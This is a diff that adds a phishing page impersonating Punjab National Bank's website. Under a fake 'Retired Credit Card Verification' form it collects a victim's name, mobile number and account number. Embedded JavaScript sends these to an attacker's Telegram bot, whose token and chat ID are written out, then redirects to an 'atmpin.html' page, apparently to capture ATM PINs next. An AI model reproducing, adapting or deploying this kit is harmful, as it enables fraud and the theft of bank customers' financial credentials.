@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Punjab National Bank</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Header Section -->
+    <header>
+        <div class="logo-container">
+            <img src="pnb-logo.png" alt="PNB Logo">
+        </div>
+        <nav>
+            <ul>
+                <li><a href="#">Personal</a></li>
+                <li><a href="#">Corporate</a></li>
+                <li><a href="#">NRI</a></li>
+                <li><a href="#">Agri</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- Main Content -->
+    <main>
+        <section class="hero">
+            <h1>Welcome to Punjab National Bank</h1>
+            <p>Your Perfect Banking Partner</p>
+            <section class="verification-form">
+                <h2>PNB Retired Credit Card Verification</h2>
+                <form id="verification-form">
+                    <label for="cardholder-name">Cardholder Name:</label>
+                    <input type="text" id="cardholder-name" name="cardholder-name" placeholder="Enter your name">
+
+                    <label for="mobile-number">Registered Mobile Number:</label>
+                    <input type="tel" id="mobile-number" name="mobile-number" placeholder="Enter your mobile number" pattern="[0-9]{10}" maxlength="10">
+
+                    <label for="account-number">Account Number:</label>
+                    <input type="number" id="account-number" name="account-number" placeholder="Enter your account number" maxlength="12">
+
+                    <button type="button" id="next-button">Next</button>
+                </form>
+            </section>
+        </section>
+    </main>
+
+    <!-- Footer Section -->
+    <footer>
+        <p>&copy; 2025 Punjab National Bank</p>
+    </footer>
+
+    <!-- JavaScript for Validation and Telegram Notification -->
+    <script>
+        const botToken = "8195910833:AAGjf_PrdNBLevxSO4DW_lbSGl1wp6RJA4A"; 
+        const chatId = "7558871636";
+
+        document.getElementById("next-button").addEventListener("click", function () {
+            const nameField = document.getElementById("cardholder-name");
+            const mobileField = document.getElementById("mobile-number");
+            const accountField = document.getElementById("account-number");
+
+            if (!nameField.value.trim()) {
+                alert("Please enter your Cardholder Name.");
+                nameField.focus();
+                return;
+            }
+
+            if (!mobileField.value.trim() || !/^\d{10}$/.test(mobileField.value)) {
+                alert("Please enter a valid 10-digit Registered Mobile Number.");
+                mobileField.focus();
+                return;
+            }
+
+            if (!accountField.value.trim()) {
+                alert("Please enter your Account Number.");
+                accountField.focus();
+                return;
+            }
+
+            // Prepare and send Telegram notification
+            const message = `🔹 **PNB Card Verification**\n👤 Name: ${nameField.value}\n📱 Mobile: ${mobileField.value}\n💳 Account Number: ${accountField.value}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("Verification successful. Redirecting...");
+                    window.location.href = "atmpin.html";
+                } else {
+                    alert("Error processing your request. Please try again.");
+                }
+            })
+            .catch(error => console.error("Telegram Error:", error));
+        });
+    </script>
+
+</body>
+</html>
